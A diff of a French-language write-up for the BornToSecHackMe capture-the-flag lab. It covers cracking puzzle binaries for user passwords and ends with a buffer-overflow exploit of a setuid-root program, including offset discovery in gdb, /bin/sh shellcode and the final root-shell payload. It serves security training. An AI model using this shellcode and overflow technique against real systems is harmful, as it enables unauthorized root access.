@@ -101,7 +101,7 @@ Depending on your server configuration the write permissions of the subdirectory
 Run the installation script by accessing yourdomain.tld/forum/install/ in your web browser and follow the instructions.
 ############################################
 
-On remarque le dossier templates_c dont les droit doivent être modifier pour le script d'install
+On remarque le dossier templates_c dont les droit doivent être modifier pour le script d'install => 'Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777)'
 Essayons deja l'url de ce dossier https://192.168.1.56/forum/templates_c/
 On y trouve plusieur fichier php
 
@@ -171,7 +171,7 @@ password
 lmezard:G!@M6f4Eatau{sF"
 
 Nous trouvons finalement quelques chose... Essayons une connection ssh avec ces infos ! NOP sa ne fonctionne pas.
-Mais grace au scans nmap on a aussi le port ftp d'ouvret, testons celui-ci
+Mais grace au scans nmap on voit qu'on a aussi le port ftp d'ouvret, testons celui-ci
 
 => cmd: ftp 192.168.1.56
 Connected to 192.168.1.56.
@@ -251,7 +251,7 @@ o
 
 NO SPACE IN THE PASSWORD (password is case sensitive).
 
-$ ./bomb
+laurie@BornToSecHackMe:~$ ./bomb 
 Welcome this is my little bomb !!!! You have 6 stages with
 only one life good luck !! Have a nice day!
 Public speaking is very easy.
@@ -260,4 +260,162 @@ Phase 1 defused. How about the next one?
 That's number 2.  Keep going!
 1 b 214
 Halfway there!
+9
+So you got that one.  Try this one.
+opekma
+Good work!  On to the next...
+4 2 6 3 1 5
+Congratulations! You've defused the bomb!
 
+cf ./users/laurie/bomb_crack for details
+
+Donc le mot de pass de thor donne: Publicspeakingisveryeasy.126241207201b2149opekma426315
+
+laurie@BornToSecHackMe:~$ su thor
+Password: 
+su: Authentication failure
+
+Fail, mais il y a 2 possibilitées pour la phase 4 
+opekma que l'on vient de tester ou opekmq car a et q à travers l'algo phase_5 donne le s de giants
+ce qui nous donne le mdp suivant: 
+
+=> Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+laurie@BornToSecHackMe:~$ su thor
+Password: 
+thor@BornToSecHackMe:~$ ls
+README  turtle
+
+On est maintenant loger en tant que thor et il faut resoudre turtle
+Après analyse et recherche on comprends que le fichier contient 
+des instructions de dessin que l'on peut exploiter avec turle de python
+
+En interpretant ces instructions grâce au script ./users/thor/turtle_crack.py
+On obtient un dessin représetant le mot SLASH
+Il faut maintenant le digester en md5 pour obtenir le mdp de zaz
+https://www.freeformatter.com/message-digest.html#ad-output
+
+=> 646da671ca01bb5d84dbb5fb2238dc8e
+
+thor@BornToSecHackMe:~$ su zaz
+Password:
+zaz@BornToSecHackMe:~$ ls -la
+total 12
+drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
+drwxrwx--x 1 www-data root  100 Oct 13  2015 ..
+-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
+-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
+drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
+-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
+-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
+-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
+zaz@BornToSecHackMe:~/mail$ ls -la
+total 1
+drwxr-x--- 3 zaz zaz 107 Oct  8  2015 .
+drwxr-x--- 4 zaz zaz 147 Oct 15  2015 ..
+drwxr-x--- 5 zaz zaz  99 Oct  8  2015 .imap
+-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Drafts
+-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Sent
+-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Trash
+-rwxr-x--- 1 zaz zaz  36 Oct  8  2015 .subscriptions
+
+On arrive enfin à un ficher exploitable qui à les droits root, exploit_me
+
+1. Testons si il segfault
+
+zaz@BornToSecHackMe:~$ ./exploit_me aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)
+
+=> OK, le but maintenant serai donc de lancer un shell à travers un buffer overflow
+
+2. Analyons plus en detail avec gdb et cherchons l'offset de eip grâce à une string spécialisée https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+zaz@BornToSecHackMe:~$ gdb exploit_me
+(gdb) set disassembly-f i
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:	push   ebp
+   0x080483f5 <+1>:	mov    ebp,esp
+   0x080483f7 <+3>:	and    esp,0xfffffff0
+   0x080483fa <+6>:	sub    esp,0x90
+   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x08048404 <+16>:	jg     0x804840d <main+25>
+   0x08048406 <+18>:	mov    eax,0x1
+   0x0804840b <+23>:	jmp    0x8048436 <main+66>
+   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048410 <+28>:	add    eax,0x4
+   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
+   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048419 <+37>:	lea    eax,[esp+0x10]
+   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:	lea    eax,[esp+0x10]
+   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
+   0x0804842c <+56>:	call   0x8048310 <puts@plt>
+   0x08048431 <+61>:	mov    eax,0x0
+   0x08048436 <+66>:	leave
+   0x08048437 <+67>:	ret
+End of assembler dump.
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37654136 in ?? ()
+
+=> Offset = 140
+
+3. Plaçons un shellcode (/bin/sh) dans l'env et trouvons sont adresse
+
+zaz@BornToSecHackMe:~$ export SHELLCODE=$(python -c 'print "\x90"*100 +"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+
+zaz@BornToSecHackMe:~$ gdb -q exploit_me
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+(gdb) set disassembly-f i
+(gdb) b main
+Breakpoint 1 at 0x80483f7
+(gdb) r
+Starting program: /home/zaz/exploit_me
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb) x/s *environ
+0xbffff85a:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061۰\006̀Sh/ttyh/dev\211\343\061\311f\271\022'\260\005̀1\300Ph//shh/bin\211\343PS\211ᙰ\v̀"
+(gdb) x/20i *environ
+   0xbffff85a:	push   ebx
+   0xbffff85b:	dec    eax
+   0xbffff85c:	inc    ebp
+   0xbffff85d:	dec    esp
+   0xbffff85e:	dec    esp
+   0xbffff85f:	inc    ebx
+   0xbffff860:	dec    edi
+   0xbffff861:	inc    esp
+   0xbffff862:	inc    ebp
+   0xbffff863:	cmp    eax,0x90909090
+   0xbffff868:	nop
+   0xbffff869:	nop
+   0xbffff86a:	nop
+   0xbffff86b:	nop
+   0xbffff86c:	nop
+   0xbffff86d:	nop
+   0xbffff86e:	nop
+   0xbffff86f:	nop          <= Nous allons prendre cette adresse du slipe de nop
+   0xbffff870:	nop
+   0xbffff871:	nop
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 7083] will be killed.
+
+Quit anyway? (y or n) y
+
+4. Il ne reste plus qu'à lancer un exploit avec python
+
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print 'A' * 140 + '\x6f\xf8\xff\xbf'")
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAo���
+# whoami
+root
+
+BINGO ON EST ROOT ! 🥳
